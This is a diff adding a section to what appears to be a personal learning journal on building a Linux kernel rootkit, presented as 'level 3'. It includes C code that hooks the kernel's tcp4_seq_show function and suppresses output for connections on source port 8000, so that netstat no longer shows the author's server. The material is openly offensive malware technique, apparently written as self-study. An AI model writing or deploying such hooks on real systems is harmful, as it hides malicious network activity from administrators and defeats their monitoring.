@@ -297,3 +297,24 @@ I should properly step up my debug game- printk is not enough and doesn't help a
 
 I've decided its better to write every step of the rootkit in a seperate module, for better debugging.
 
+when I seperated it into 2 files it suddenly worked- no idea what happened here, but it seems I entered a rabbit hole of debugging it.
+
+since all that these functions do is print stuff, I feel comfortable messsing them up and making them not print the line with my server. every call to the function is returning one line, and it returns 0 if it succeeds, so no harm in returning early and printing an empty line if it contains our intended source port.
+
+```c
+inet = inet_sk(sk);
+	srcp = ntohs(inet->inet_sport);
+	if (srcp == 8000){
+		printk(KERN_INFO "netstat_rootkit: identified tcp traffic to port 8000\n");
+		seq_puts(seq, "");
+		return 0;
+	}
+	return old_tcp4_seq_show(seq, v);
+```
+
+now netstat -ant doesn't show my server.
+
+
+
+and thats level 3 done.
+
